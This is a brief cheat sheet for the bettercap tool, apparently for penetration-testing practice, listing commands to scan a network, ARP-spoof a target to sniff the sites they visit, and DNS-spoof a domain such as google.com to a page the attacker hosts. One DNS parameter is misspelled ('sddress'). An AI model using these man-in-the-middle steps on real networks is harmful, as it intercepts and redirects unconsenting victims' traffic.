<h1>bettercap Cheat sheet</h1>

<h2>Cli Commands</h2>


<h2>Procedure:</h2>

<p align="Left">
- sudo bettercap --iface eth0 - Bettercap start at the ethernet interface 0 <br/> 
- net.probe on - start scanning the network for hosts<br/>
- net.show - displays info on table<br/>

Arp Spoof

          set arp.spoof.fullduplex true - Attcking module on
          set arp.spoof.targets <targetip> - setting target
          arp.spoof on - spoofer started
          net.sniff on - start sniffing and would give us the websites the target visists

DNS Spoof
  
          set dns.spoof.domains <domainname.com> - Change domain name to the name of the website that the victim going to access
          set dns.spoof.sddress <redirecting ip address> - Give the spoofer an IP for redirection
          dns.spoof on - Starting the attack
          eg - change the domain to google.com and the victim will see the page you hosting on the IP as the result
